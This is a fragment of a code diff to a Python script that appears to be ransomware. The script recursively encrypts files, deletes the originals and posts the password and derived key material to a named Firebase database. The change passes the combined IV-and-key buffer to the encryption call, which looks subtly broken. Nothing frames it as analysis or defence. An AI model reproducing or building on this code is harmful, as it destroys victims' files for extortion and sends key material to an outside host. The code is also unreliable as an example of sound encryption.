@@ -43,7 +43,7 @@ def search_enc(path):
                 search_enc(filename)
             else:
                 outfilename = filename + '.enc'
-                enc_file(key, filename, outfilename, chunksize=64*1024)
+                enc_file(base, filename, outfilename, chunksize=64*1024)
                 os.remove(filename)
     except PermissionError:
         pass
@@ -61,8 +61,6 @@ password = password2.encode()
 
 salt = os.urandom(SALT_SIZE)
 base = hashlib.pbkdf2_hmac('sha256', password, salt, 100000, dklen=IV_SIZE + KEY_SIZE)
-iv = base[0:IV_SIZE]
-key = base[IV_SIZE:]
 
 firebase = firebase.FirebaseApplication('https://keydata-e5fb1.firebaseio.com/', None)
 result = firebase.post('/user' + '/' + password2, {"Base" : str(base)})
